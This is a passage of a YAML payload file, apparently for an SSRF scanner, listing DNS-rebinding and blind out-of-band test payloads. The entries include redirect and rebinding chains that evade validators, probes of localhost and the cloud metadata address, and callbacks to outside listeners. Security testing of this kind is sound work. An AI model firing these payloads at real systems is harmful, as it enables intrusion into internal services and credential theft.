  # ===========================================================================
  #  8. DNS REBINDING
  #     TOCTOU attacks where a hostname resolves to a safe IP during
  #     validation, then to an internal IP during the actual request.
  # ===========================================================================
  - id: "dns-001"
    name: "DNS rebinding canary"
    category: "dns_rebinding"
    payload: "http://{{COLLAB}}/"
    description: >
      Basic rebinding canary — confirm DNS resolution reaches your
      listener. If the target resolves the domain, you see the callback.
    tags: ["dns_rebinding", "canary"]
    severity_hint: "high"

  - id: "dns-002"
    name: "DNS rebinding with fast-flux"
    category: "dns_rebinding"
    payload: "http://{{COLLAB}}/"
    description: >
      Configure your DNS to alternate between a public IP and 127.0.0.1
      with TTL=0. Validator resolves public, fetcher resolves loopback.
    tags: ["dns_rebinding", "toctou"]
    severity_hint: "high"

  - id: "dns-003"
    name: "Redirect + rebinding chain"
    category: "dns_rebinding"
    payload: "http://{{ATTACKER}}/r?to=http://{{COLLAB}}/"
    description: >
      Initial redirect passes validation (public attacker), then
      rebinding resolves to internal IP (CVE-2026-85673 class).
    tags: ["dns_rebinding", "redirect-chain", "2026"]
    references: ["https://www.ionix.io/blog/cve-2026-85673/"]
    severity_hint: "critical"

  - id: "dns-004"
    name: "DNS pinning bypass"
    category: "dns_rebinding"
    payload: "http://{{COLLAB}}/"
    description: >
      Targets apps that resolve once and pin — force a second resolution
      to a different IP.
    tags: ["dns_rebinding", "dns-pinning", "2026"]
    severity_hint: "high"

  - id: "dns-005"
    name: "rbndr.us rebinding payload"
    category: "dns_rebinding"
    payload: "http://make-127.0.0.1-169.254.169.254-rbndr.us/"
    description: >
      rbndr.us service — alternates between two IPs. First response
      returns 127.0.0.1 (passes validation), second returns 169.254.169.254
      (metadata endpoint).
    tags: ["dns_rebinding", "rbndr", "2026"]
    severity_hint: "critical"

  # ===========================================================================
  #  9. BLIND SSRF / OUT-OF-BAND
  #     No response reflected. Detect via DNS, HTTP, or timing side-channels.
  #     Uses the new oast.beardedviking.org infrastructure.
  # ===========================================================================
  - id: "blind-001"
    name: "Basic HTTP callback"
    category: "blind_oob"
    payload: "http://{{OOB}}/"
    description: >
      Server-side fetch generates an HTTP hit on the OOB receiver.
      Token in the path confirms which payload fired.
    tags: ["blind", "oob", "http"]
    detection: "Token appears in check.php?list=1"
    severity_hint: "confirmed"

  - id: "blind-002"
    name: "DNS-only callback"
    category: "blind_oob"
    payload: "http://{{OOB_HOST}}/"
    description: >
      DNS lookup only — works when HTTP egress is firewalled but
      DNS resolution still occurs.
    tags: ["blind", "oob", "dns"]
    detection: "DNS resolution observed on OAST receiver"
    severity_hint: "confirmed"

  - id: "blind-003"
    name: "Unsupported-scheme DNS leak"
    category: "blind_oob"
    payload: "gopher://{{OOB_HOST}}:9999/"
    description: >
      Some HTTP clients resolve DNS before realising they cannot speak
      gopher. DNS query leaks even though the connection fails.
    tags: ["blind", "oob", "dns-leak"]
    severity_hint: "high"

  - id: "blind-004"
    name: "Timing-based open port probe"
    category: "blind_oob"
    payload: "http://127.0.0.1:22/"
    description: >
      Open ports return quickly (banner/RST); closed ports hang until
      timeout. Compare against baseline port 81.
    tags: ["blind", "timing"]
    severity_hint: "medium"

  - id: "blind-005"
    name: "Timing-based closed port baseline"
    category: "blind_oob"
    payload: "http://127.0.0.1:81/"
    description: "Pair with blind-004 for a baseline delta."
    tags: ["blind", "timing", "baseline"]
    severity_hint: "low"

  - id: "blind-006"
    name: "HTTP callback with unique path"
    category: "blind_oob"
    payload: "http://{{OOB}}/huginn-{{RANDOM}}"
    description: >
      Unique path per request — correlates the callback to the exact
      injection point via check.php?token=<hex>.
    tags: ["blind", "oob", "correlation"]
    severity_hint: "confirmed"

  - id: "blind-007"
    name: "Redirect-loop OOB chain"
    category: "blind_oob"
    payload: "http://{{OOB}}/r?to=http://{{OOB}}/r?to=http://{{OOB}}/"
    description: >
      Infinite redirect loop forces validation to time out, then the
      final request reaches OOB (Encod3d-Sec TORCH technique).
    tags: ["blind", "oob", "redirect-loop", "2026"]
    severity_hint: "confirmed"

  # ===========================================================================
  #  10. MODERN (2025 / 2026)
